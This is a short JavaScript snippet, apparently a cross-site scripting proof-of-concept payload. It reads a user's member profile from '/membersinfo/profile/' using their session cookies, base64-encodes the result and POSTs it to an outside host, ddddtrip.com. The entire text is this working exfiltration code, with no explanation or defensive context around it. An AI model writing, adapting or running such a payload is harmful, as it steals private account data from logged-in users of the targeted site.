const response = await fetch(`/membersinfo/profile/?data=testhmza`, {
  method: 'GET',
  credentials: 'include'
});

const data = await response.json();
const base64Data = btoa(JSON.stringify(data));

fetch(`https://ddddtrip.com/testhmzaa/`, {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({ data: base64Data })
});
